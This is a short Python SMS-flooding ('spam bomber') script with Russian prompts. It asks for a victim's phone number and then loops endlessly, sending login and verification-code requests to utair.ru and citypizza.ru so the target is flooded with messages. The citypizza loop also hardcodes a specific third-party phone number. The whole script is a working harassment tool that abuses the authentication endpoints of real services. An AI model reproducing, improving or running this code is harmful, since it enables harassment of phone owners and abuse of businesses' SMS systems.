
import requests
import time

print ('''╦╗║║ ╔╗╔╗║╔╔╗╗╔
╠╣╚╣ ╚╗║║╠╣║║║║
╩╝═╝ ╚╝╚╝║╚╚╝╚╝
''')

time.sleep(2)
print ("НОМЕР НУЖНО ПИСАТЬ БЕЗ ЗНАКА +")
#обычный номер
n = input("Укажите номер: ")
#для сити пиццы
n2 = ("(" + n[1:-7] + ")" + n[4:-4] + ("-") + n[7:-2] + ("-") + n[9:]) 
print ("Спам запущен на номер", n)

# utair
while True:
   r = requests.post('https://b.utair.ru/api/v1/login/',
   data = {'login':n},
   headers = {
   'Accept-Language':'en-US,en;q=0.5',
   'Connection':'keep-alive',
   'Host':'b.utair.ru',
   'origin':'https://www.utair.ru',
   'Referer':'https://www.utair.ru/'})
   time.sleep(10)   
   
#citypizza
while True:
   requests.post('https://www.citypizza.ru/auth/sendphone/',
   data = {'phone':'(923)197-59-08'},
   headers = {
   'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
   'Connection':'keep-alive',
   'Host':'www.citypizza.ru',
   'Origin':'""',
   'Referer':'https://www.citypizza.ru/auth/register/'})
   time.sleep(300)


	
	
	
	
	
	
	
	








